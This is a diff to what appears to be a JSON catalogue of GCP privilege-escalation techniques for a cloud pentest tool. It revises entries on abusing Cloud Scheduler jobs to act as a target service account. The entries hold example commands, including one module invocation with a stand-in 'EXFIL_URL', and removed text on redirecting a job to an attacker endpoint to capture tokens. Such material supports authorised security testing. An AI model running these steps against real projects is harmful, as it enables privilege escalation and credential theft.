@@ -1170,7 +1170,7 @@
           ],
           "on": "service-account"
         },
-        "description": "Create a Cloud Scheduler HTTP job with oauthToken.serviceAccountEmail=TARGET_SA and uri pointing at any googleapis.com endpoint (e.g. IAM key creation). Cloud Scheduler mints an OAuth2 access token for the target SA and sends it as Authorization: Bearer. actAs is NOT enforced at job creation time; it IS enforced at execution time by the Cloud Scheduler service agent (which needs roles/iam.serviceAccountTokenCreator on the target SA \u2014 auto-configured in real projects via roles/cloudscheduler.serviceAgent).",
+        "description": "Create a Cloud Scheduler HTTP job with oauthToken.serviceAccountEmail=TARGET_SA. actAs on the target SA is enforced at job creation time by the Cloud Scheduler API. When the job fires, the Cloud Scheduler service agent mints an OAuth2 token for the target SA and sends it as Authorization: Bearer to the specified URI. The URI must be a googleapis.com endpoint (oauthToken is rejected for non-Google URIs); use this to make any Google API call as the target SA \u2014 e.g. set a project IAM binding, create a SA key, or write to storage.",
         "example_command": "modules run exploit_cloudscheduler_job --project-id {project_id} --target-sa {target_sa} --action custom --custom-url https://EXFIL_URL --run",
         "capability_resource_type": "cloudschedulerjob",
         "status": "validated"
@@ -1179,7 +1179,8 @@
         "requires": [
           {
             "permissions": [
-              "cloudscheduler.jobs.update"
+              "cloudscheduler.jobs.update",
+              "cloudscheduler.jobs.get"
             ],
             "on": "cloudschedulerjob"
           }
@@ -1192,8 +1193,8 @@
           ],
           "on": "service-account"
         },
-        "description": "Update an existing Cloud Scheduler HTTP job to point its OIDC token service account to a high-privilege SA, or redirect the target URL to an attacker-controlled endpoint to capture the OIDC token. The job fires the updated request on its next schedule or on-demand. actAs on the target SA is required (enforced by the Cloud Scheduler API). cloudscheduler.jobs.get is NOT required when providing a full httpTarget body with updateMask=httpTarget.",
-        "example_command": "gcloud scheduler jobs update http JOB --oidc-service-account-email=TARGET_SA@PROJECT.iam.gserviceaccount.com --uri=https://TARGET_ENDPOINT",
+        "description": "Update an existing Cloud Scheduler HTTP job to redirect its oauthToken serviceAccountEmail to the target SA. The Cloud Scheduler API enforces cloudscheduler.jobs.get on the caller even when providing a full httpTarget body with updateMask=httpTarget. actAs on the target SA is enforced at update time. The job fires the updated request as the target SA on its next scheduled run or on-demand. The URI must be a googleapis.com endpoint — oauthToken is not permitted with non-Google URIs.",
+        "example_command": "gcloud scheduler jobs update http JOB --oauth-service-account-email=TARGET_SA@PROJECT.iam.gserviceaccount.com --uri=https://TARGET_GOOGLEAPIS_ENDPOINT",
         "status": "VALIDATED",
         "requires_resource_exists": true,
         "capability_resource_type": "cloudschedulerjob"
